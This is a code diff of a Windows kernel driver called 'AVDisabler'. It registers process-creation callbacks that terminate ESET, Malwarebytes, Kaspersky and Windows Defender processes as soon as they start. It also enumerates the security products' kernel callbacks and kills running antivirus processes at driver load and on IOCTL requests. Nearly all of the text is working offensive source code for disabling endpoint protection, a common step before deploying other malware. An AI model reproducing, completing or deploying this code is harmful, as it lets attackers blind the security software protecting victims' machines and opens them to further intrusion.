+UNICODE_STRING eCaptureEXE = RTL_CONSTANT_STRING(L"eCapture.exe");
+UNICODE_STRING eclsEXE = RTL_CONSTANT_STRING(L"ecls.exe");
+UNICODE_STRING ecmdEXE = RTL_CONSTANT_STRING(L"ecmd.exe");
+UNICODE_STRING ecmdsEXE = RTL_CONSTANT_STRING(L"ecmds.exe");
+UNICODE_STRING eeclntEXE = RTL_CONSTANT_STRING(L"eeclnt.exe");
+UNICODE_STRING eguiEXE = RTL_CONSTANT_STRING(L"egui.exe");
+UNICODE_STRING eguiProxyEXE = RTL_CONSTANT_STRING(L"eguiProxy.exe");
+*/
 void PreventEsetProcessCreate(PEPROCESS Process, HANDLE ProcessId, PPS_CREATE_NOTIFY_INFO CreateInfo)
 {
 	NTSTATUS status = STATUS_SUCCESS;
@@ -883,11 +1089,14 @@ void PreventEsetProcessCreate(PEPROCESS Process, HANDLE ProcessId, PPS_CREATE_NO
 	}
 
 	// checking if the process being created is one of Eset's processes
-	if (RtlCompareUnicodeString(&ImageFileName, &DefenderMsMpEng, TRUE) == 0 ||
-		RtlCompareUnicodeString(&ImageFileName, &DefenderSecurityHealthService, TRUE) == 0 ||
-		RtlCompareUnicodeString(&ImageFileName, &DefenderSecurityHealthSystray, TRUE) == 0 ||
-		RtlCompareUnicodeString(&ImageFileName, &DefenderSecurityHealthHost, TRUE) == 0 ||
-		RtlCompareUnicodeString(&ImageFileName, &DefenderSecHealthUI, TRUE) == 0)
+	if (RtlCompareUnicodeString(&ImageFileName, &CallmsiEXE, TRUE) == 0 ||
+		RtlCompareUnicodeString(&ImageFileName, &eCaptureEXE, TRUE) == 0 ||
+		RtlCompareUnicodeString(&ImageFileName, &eclsEXE, TRUE) == 0 ||
+		RtlCompareUnicodeString(&ImageFileName, &ecmdEXE, TRUE) == 0 ||
+		RtlCompareUnicodeString(&ImageFileName, &ecmdsEXE, TRUE) == 0 ||
+		RtlCompareUnicodeString(&ImageFileName, &eeclntEXE, TRUE) == 0 ||
+		RtlCompareUnicodeString(&ImageFileName, &eguiEXE, TRUE) == 0 ||
+		RtlCompareUnicodeString(&ImageFileName, &eguiProxyEXE, TRUE) == 0)
 	{
 		status = ObOpenObjectByPointer(Process, OBJ_KERNEL_HANDLE, nullptr, GENERIC_ALL, *PsProcessType, KernelMode, &hProcess);
 		if (!NT_SUCCESS(status))
@@ -909,9 +1118,11 @@ void PreventEsetProcessCreate(PEPROCESS Process, HANDLE ProcessId, PPS_CREATE_NO
 	}
 }
 
-void PreventMalwareBytesProcessCreate(PEPROCESS Process,
-	HANDLE ProcessId,
-	PPS_CREATE_NOTIFY_INFO CreateInfo)
+// Malwarebytes Processes
+//UNICODE_STRING MalwarebytesEXE = RTL_CONSTANT_STRING(L"Malwarebytes.exe");
+//UNICODE_STRING MBAMServiceEXE = RTL_CONSTANT_STRING(L"MBAMService.exe");
+
+void PreventMalwareBytesProcessCreate(PEPROCESS Process, HANDLE ProcessId, PPS_CREATE_NOTIFY_INFO CreateInfo)
 {
 
 	NTSTATUS status = STATUS_SUCCESS;
@@ -933,11 +1144,54 @@ void PreventMalwareBytesProcessCreate(PEPROCESS Process,
 	}
 
 	// checking if the process being created is one of MalwareBytes's processes
-	if (RtlCompareUnicodeString(&ImageFileName, &DefenderMsMpEng, TRUE) == 0 ||
-		RtlCompareUnicodeString(&ImageFileName, &DefenderSecurityHealthService, TRUE) == 0 ||
-		RtlCompareUnicodeString(&ImageFileName, &DefenderSecurityHealthSystray, TRUE) == 0 ||
-		RtlCompareUnicodeString(&ImageFileName, &DefenderSecurityHealthHost, TRUE) == 0 ||
-		RtlCompareUnicodeString(&ImageFileName, &DefenderSecHealthUI, TRUE) == 0)
+	if (RtlCompareUnicodeString(&ImageFileName, &MalwarebytesEXE, TRUE) == 0 ||
+		RtlCompareUnicodeString(&ImageFileName, &MBAMServiceEXE, TRUE) == 0)
+	{
+		status = ObOpenObjectByPointer(Process, OBJ_KERNEL_HANDLE, nullptr, GENERIC_ALL, *PsProcessType, KernelMode, &hProcess);
+		if (!NT_SUCCESS(status))
+		{
+			KdPrint(("[-] AVDisabler::PreventMalwareBytesProcessCreate: Can't open handle to process. (NTSTATUS: 0x%x)\n", status));
+			return;
+		}
+
+		KdPrint(("[+] AVDisabler::PreventMalwareBytesProcessCreate: handle to %wZ was opened successfully!!\n", CreateInfo->ImageFileName));
+		status = ZwTerminateProcess(hProcess, STATUS_ACCESS_VIOLATION); //Check if there is a need to ObDerefernceObject the PEPROCESS to avoid memory leak
+		if (!NT_SUCCESS(status))
+		{
+			KdPrint(("[-] AVDisabler::PreventMalwareBytesProcessCreate: Can't terminate process (NTSTATUS: 0x%x)\n", status));
+			return;
+		}
+
+		KdPrint(("[+] AVDisabler::PreventMalwareBytesProcessCreated: process %d of %wZ was terminated successfully!!\n", HandleToUlong(ProcessId), CreateInfo->ImageFileName));
+
+	}
+}
+
+void PreventKasperskyProcessCreate(PEPROCESS Process, HANDLE ProcessId, PPS_CREATE_NOTIFY_INFO CreateInfo)
+{
+
+	NTSTATUS status = STATUS_SUCCESS;
+	HANDLE hProcess = nullptr;
+
+	UNICODE_STRING ObOpenObjectByPointerFuncName = RTL_CONSTANT_STRING(L"ObOpenObjectByPointer");
+	fObOpenObjectByPointer ObOpenObjectByPointer = (fObOpenObjectByPointer)MmGetSystemRoutineAddress(&ObOpenObjectByPointerFuncName);
+	KdPrint(("[+]AVDisablerDriver::PreventMalwareBytesProcessCreate: ObGetObjectByPointer address: 0x%p\n", ObOpenObjectByPointer));
+
+	// checking if the process being created is one of Malwarebyte's processes
+	// 
+	// ---------- !!!!!need to modify the processes' variables to Malwarebytes images names!!!!! ----------
+	UNICODE_STRING ImageFileName;
+	status = GetFileNameFromPath(*CreateInfo->ImageFileName, &ImageFileName);
+	if (!NT_SUCCESS(status))
+	{
+		KdPrint(("[-] AVDisabler::DriverEntry:GetFileNameFromPath was failed with NTSTATUS 0x%x\n", status));
+		return;
+	}
+
+	// checking if the process being created is one of MalwareBytes's processes
+	if (RtlCompareUnicodeString(&ImageFileName, &avpEXE, TRUE) == 0 ||
+		RtlCompareUnicodeString(&ImageFileName, &avpuiEXE, TRUE) == 0 ||
+		RtlCompareUnicodeString(&ImageFileName, &avpiaEXE, TRUE) == 0)
 	{
 		status = ObOpenObjectByPointer(Process, OBJ_KERNEL_HANDLE, nullptr, GENERIC_ALL, *PsProcessType, KernelMode, &hProcess);
 		if (!NT_SUCCESS(status))
@@ -956,7 +1210,6 @@ void PreventMalwareBytesProcessCreate(PEPROCESS Process,
 		}
 
 		KdPrint(("[+] AVDisabler::PreventMalwareBytesProcessCreated: process %d of %wZ was terminated successfully!!\n", HandleToUlong(ProcessId), CreateInfo->ImageFileName));
-
 	}
 }
 
@@ -983,89 +1236,110 @@ NTSTATUS IOCTLHandlerDispatchRoutine(PDEVICE_OBJECT DeviceObject, PIRP Irp)
 	PIO_STACK_LOCATION IoStackLocation = IoGetCurrentIrpStackLocation(Irp);
 	char OutputBuffer[256];
 
-	if(IoStackLocation->Parameters.DeviceIoControl.IoControlCode == IOCTL_DISABLE_DEFENDER &&
-	   IoStackLocation->Parameters.DeviceIoControl.IoControlCode == IOCTL_DISABLE_ESET &&
-	   IoStackLocation->Parameters.DeviceIoControl.IoControlCode == IOCTL_DISABLE_MALWAREBYTES)
-		TerminateAVProcesses(IoStackLocation->Parameters.DeviceIoControl.IoControlCode);
-
 	switch (IoStackLocation->Parameters.DeviceIoControl.IoControlCode)
 	{
-	case IOCTL_DISABLE_DEFENDER:
-	{
-		ULONG_PTR InputBufferLength = IoStackLocation->Parameters.DeviceIoControl.InputBufferLength;
-		ULONG_PTR OutputBufferLength = IoStackLocation->Parameters.DeviceIoControl.OutputBufferLength;
-		PVOID SystemBuffer = Irp->AssociatedIrp.SystemBuffer; // use only if needed...
-
-		if (InputBufferLength < sizeof(UNICODE_STRING) && OutputBufferLength < 256)
+		case IOCTL_DISABLE_DEFENDER:
 		{
-			KdPrint(("AVDisablerDriver::IOCTL_DISABLE_DEFENDER: invalid size of input buffer!\n"));
-			return CompleteRequest(STATUS_INSUFFICIENT_RESOURCES, Irp, 0);
+			ULONG_PTR InputBufferLength = IoStackLocation->Parameters.DeviceIoControl.InputBufferLength;
+			ULONG_PTR OutputBufferLength = IoStackLocation->Parameters.DeviceIoControl.OutputBufferLength;
+			PVOID SystemBuffer = Irp->AssociatedIrp.SystemBuffer; // use only if needed...
+
+			if (InputBufferLength < sizeof(UNICODE_STRING) && OutputBufferLength < 256)
+			{
+				KdPrint(("AVDisablerDriver::IOCTL_DISABLE_DEFENDER: invalid size of input buffer!\n"));
+				return CompleteRequest(STATUS_INSUFFICIENT_RESOURCES, Irp, 0);
+			}
+
+			// NtQuerySystemInformation() in GetAVPIDs()only worked with IoCreateSystemThread()
+			HANDLE hThread;
+			CLIENT_ID ClientID;
+			status = IoCreateSystemThread(DeviceObject, &hThread, GENERIC_ALL, nullptr, NtCurrentProcess(), &ClientID, (PKSTART_ROUTINE)GetAVPIDs, nullptr);
+			//ZwClose(hThread);
+
+			/*
+			Synchronization issue here!!!
+			*/
+
+			//KIRQL currentIrql = KeGetCurrentIrql();
+			//KdPrint(("Current IRQL: %u\n", currentIrql));
+			//if(currentIrql > PASSIVE_LEVEL)
+			//	KeLowerIrql(PASSIVE_LEVEL); // to avoid IRQL_NOT_LESS_OR_EQUAL bugcheck
+			//
+			////KeWaitForSingleObject(hThread, Executive, KernelMode, FALSE, NULL);   /// causes IRQL_NOT_LESS_OR_EQUAL bugcheck
+
+			status = IoCreateSystemThread(DeviceObject, &hThread, GENERIC_ALL, nullptr, NtCurrentProcess(), &ClientID, (PKSTART_ROUTINE)TerminateAVProcesses, nullptr);
+			if (!NT_SUCCESS(status))
+				KdPrint(("IOCTL_DISABLE_DEFENDER::TerminateAVProcesses() failed with: 0x%x\n", status));
+			ZwClose(hThread);
+
+
+			if (!g_IsDefenderCallbackRoutineSet)
+			{
+				status = EnumerateAVCallbackRoutinesBaseAddress(&PspCreateProcessCallbackRoutine, &PspCreateThreadCallbackRoutine, &PspLoadImageCallbackRoutine);
+				if (!NT_SUCCESS(status))
+					KdPrint(("[-] AVDisabler::IOCTL_DISABLE_DEFENDER: EnumerateAVCallbackRoutinesBaseAddress() failed with: 0x%x\n", status));
+
+				status = PsSetCreateProcessNotifyRoutineEx(PreventDefenderProcessCreate, FALSE);
+				if (!NT_SUCCESS(status))
+				{
+					sprintf(OutputBuffer, "[-] AVDisablerDriver::IOCTL_DISABLE_DEFENDER: Failed to set Defender's process creation callback routine\n (NTSTATUS: 0x%x)", status);
+					KdPrint((OutputBuffer));
+					memcpy_s(SystemBuffer, OutputBufferLength, OutputBuffer, OutputBufferLength);
+					return CompleteRequest(status, Irp, sizeof(OutputBuffer));
+				}
+
+				g_IsDefenderCallbackRoutineSet = TRUE;
+				KdPrint(("[+] AVDisablerDriver::IOCTL_DISABLE_DEFENDER: Process creation callback routine was created successfully!\n"));
+			}
 		}
 
-		status = EnumerateAVCallbackRoutinesBaseAddress(&PspCreateProcessCallbackRoutine, &PspCreateThreadCallbackRoutine, &PspLoadImageCallbackRoutine);
-		if (!NT_SUCCESS(status)) 
-			KdPrint(("[-] AVDisabler::IOCTL_DISABLE_DEFENDER: EnumerateAVCallbackRoutinesBaseAddress() failed with: 0x%x\n", status));
+		//case IOCTL_DISABLE_ESET:
+		//{
+		//	ULONG_PTR InputBufferLength = IoStackLocation->Parameters.DeviceIoControl.InputBufferLength;
+		//	ULONG_PTR OutputBufferLength = IoStackLocation->Parameters.DeviceIoControl.OutputBufferLength;
+		//	PVOID SystemBuffer = Irp->AssociatedIrp.SystemBuffer; // use only if needed...
+		//	if (InputBufferLength < sizeof(UNICODE_STRING) && OutputBufferLength < 256)
+		//	{
+		//		KdPrint(("AVDisablerDriver::IOCTL_DISABLE_ESET: invalid size of input buffer!\n"));
+		//		return CompleteRequest(STATUS_INSUFFICIENT_RESOURCES, Irp, 0);
+		//	}
 
-		status = PsSetCreateProcessNotifyRoutineEx(PreventDefenderProcessCreate, FALSE);
-		if (!NT_SUCCESS(status))
-		{
-			sprintf(OutputBuffer, "[-] AVDsiablerDriver::IOCTL_DISABLE_DEFENDER: Failed to set Defender's process creation callback routine\n (NTSTATUS: 0x%x)", status);
-			KdPrint((OutputBuffer));
-			memcpy_s(SystemBuffer, OutputBufferLength, OutputBuffer, OutputBufferLength);
-			return CompleteRequest(status, Irp, sizeof(OutputBuffer));
-		}
+		//	status = PsSetCreateProcessNotifyRoutineEx(PreventEsetProcessCreate, FALSE);
+		//	if (!NT_SUCCESS(status))
+		//	{
+		//		sprintf(OutputBuffer, "[-] AVDsiablerDriver::IOCTL_DISABLE_ESET: Failed to set ESET's related process creation callback routine\n (NTSTATUS: 0x%x)", status);
+		//		KdPrint((OutputBuffer));
+		//		memcpy_s(SystemBuffer, OutputBufferLength, OutputBuffer, OutputBufferLength);
+		//		return CompleteRequest(status, Irp, 0);
+		//	}
+		//	g_IsEsetCallbackRoutineSet = TRUE;
+		//	KdPrint(("[+] AVDsiablerDriver::IOCTL_DISABLE_ESET: Process creation callback routine was created successfully!\n"));
 
-		g_IsDefenderCallbackRoutineSet = TRUE;
-		KdPrint(("[+] AVDsiablerDriver::IOCTL_DISABLE_DEFENDER: Process creation callback routine was created successfully!\n"));
-	}
+		//}
 
-	case IOCTL_DISABLE_ESET:
-	{
-		ULONG_PTR InputBufferLength = IoStackLocation->Parameters.DeviceIoControl.InputBufferLength;
-		ULONG_PTR OutputBufferLength = IoStackLocation->Parameters.DeviceIoControl.OutputBufferLength;
-		PVOID SystemBuffer = Irp->AssociatedIrp.SystemBuffer; // use only if needed...
-		if (InputBufferLength < sizeof(UNICODE_STRING) && OutputBufferLength < 256)
-		{
-			KdPrint(("AVDisablerDriver::IOCTL_DISABLE_ESET: invalid size of input buffer!\n"));
-			return CompleteRequest(STATUS_INSUFFICIENT_RESOURCES, Irp, 0);
-		}
+		//case IOCTL_DISABLE_MALWAREBYTES:
+		//{
+		//	ULONG_PTR InputBufferLength = IoStackLocation->Parameters.DeviceIoControl.InputBufferLength;
+		//	ULONG_PTR OutputBufferLength = IoStackLocation->Parameters.DeviceIoControl.OutputBufferLength;
+		//	PVOID SystemBuffer = Irp->AssociatedIrp.SystemBuffer; // use only if needed...
+		//	if (InputBufferLength < sizeof(UNICODE_STRING) && OutputBufferLength < 256)
+		//	{
+		//		KdPrint(("AVDisablerDriver::IOCTL_DISABLE_MALWAREBYTES: invalid size of input buffer!\n"));
+		//		return CompleteRequest(STATUS_INSUFFICIENT_RESOURCES, Irp, 0);
 
-		status = PsSetCreateProcessNotifyRoutineEx(PreventEsetProcessCreate, FALSE);
-		if (!NT_SUCCESS(status))
-		{
-			sprintf(OutputBuffer, "[-] AVDsiablerDriver::IOCTL_DISABLE_ESET: Failed to set ESET's related process creation callback routine\n (NTSTATUS: 0x%x)", status);
-			KdPrint((OutputBuffer));
-			memcpy_s(SystemBuffer, OutputBufferLength, OutputBuffer, OutputBufferLength);
-			return CompleteRequest(status, Irp, 0);
-		}
-		g_IsEsetCallbackRoutineSet = TRUE;
-		KdPrint(("[+] AVDsiablerDriver::IOCTL_DISABLE_ESET: Process creation callback routine was created successfully!\n"));
+		//	}
 
-	}
-
-	case IOCTL_DISABLE_MALWAREBYTES:
-	{
-		ULONG_PTR InputBufferLength = IoStackLocation->Parameters.DeviceIoControl.InputBufferLength;
-		ULONG_PTR OutputBufferLength = IoStackLocation->Parameters.DeviceIoControl.OutputBufferLength;
-		PVOID SystemBuffer = Irp->AssociatedIrp.SystemBuffer; // use only if needed...
-		if (InputBufferLength < sizeof(UNICODE_STRING) && OutputBufferLength < 256)
-		{
-			KdPrint(("AVDisablerDriver::IOCTL_DISABLE_MALWAREBYTES: invalid size of input buffer!\n"));
-			return CompleteRequest(STATUS_INSUFFICIENT_RESOURCES, Irp, 0);
-
-		}
-
-		status = PsSetCreateProcessNotifyRoutineEx(PreventMalwareBytesProcessCreate, FALSE);
-		if (!NT_SUCCESS(status))
-		{
-			sprintf(OutputBuffer, "[-] AVDsiablerDriver::IOCTL_DISABLE_MALWAREBYTES: Failed to set MalwareByte's related process creation callback routine\n (NTSTATUS: 0x%x)", status);
-			KdPrint((OutputBuffer));
-			memcpy_s(SystemBuffer, OutputBufferLength, OutputBuffer, OutputBufferLength);
-			return CompleteRequest(status, Irp, 0);
-		}
-		g_IsMalwareBytesCallbackRoutineSet = TRUE;
-		KdPrint(("[+] AVDisablerDriver::IOCTL_DISABLE_MALWAREBYTES: Process creation callback routine was created successfully!\n"));
-	}
+		//	status = PsSetCreateProcessNotifyRoutineEx(PreventMalwareBytesProcessCreate, FALSE);
+		//	if (!NT_SUCCESS(status))
+		//	{
+		//		sprintf(OutputBuffer, "[-] AVDsiablerDriver::IOCTL_DISABLE_MALWAREBYTES: Failed to set MalwareByte's related process creation callback routine\n (NTSTATUS: 0x%x)", status);
+		//		KdPrint((OutputBuffer));
+		//		memcpy_s(SystemBuffer, OutputBufferLength, OutputBuffer, OutputBufferLength);
+		//		return CompleteRequest(status, Irp, 0);
+		//	}
+		//	g_IsMalwareBytesCallbackRoutineSet = TRUE;
+		//	KdPrint(("[+] AVDisablerDriver::IOCTL_DISABLE_MALWAREBYTES: Process creation callback routine was created successfully!\n"));
+		//}
 	}
 
 	return CompleteRequest(status, Irp, 0);
@@ -1146,16 +1420,9 @@ extern "C" NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING Reg
 	}
 
 	KdPrint(("[+] AVDisabler::DriverEntry: Device symlink %wZ was created successfully!\n", &DeviceSymlink));
-	//status = PsSetCreateProcessNotifyRoutineEx(PreventDefenderProcessCreate, FALSE);
-	//g_IsDefenderCallbackRoutineSet = TRUE;
-	//if (!NT_SUCCESS(status))
-	//	KdPrint(("AVDisabler::DriverEntry: Failed PsSetCreateProcessNotifyRoutineEx(): 0x%x\n", status));
-	//KdPrint(("AVDisabler::DriverEntry: PsSetCreateProcessNotifyRoutineEx() executed successfully!\n"));
 
-	// These 2 have been successfully tested!
-	status = EnumerateAVCallbackRoutinesBaseAddress(&PspCreateProcessCallbackRoutine, &PspCreateThreadCallbackRoutine, &PspLoadImageCallbackRoutine);
-	status = TerminateAVProcesses(IOCTL_DISABLE_DEFENDER); 
-
+	GetAVPIDs();
+	TerminateAVProcesses();
 	KdPrint(("\n"));
 
 	DriverObject->MajorFunction[IRP_MJ_CREATE] = CreateCloseDispatchRoutine;
